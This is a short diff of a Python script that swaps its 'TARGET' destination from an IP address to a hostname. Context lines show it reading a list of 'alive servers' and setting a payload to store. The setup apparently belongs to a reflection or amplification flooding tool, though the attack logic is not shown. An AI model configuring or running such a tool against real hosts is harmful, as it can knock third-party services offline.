@@ -35,7 +35,7 @@ with open('alive-servers.txt') as servers:
 
 
 # Destination
-TARGET = '87.221.61.101'
+TARGET = 'pi.hxx.pw'
 
 # optional payload to set if no keys exist
 payload = requests.get('https://google.com').text
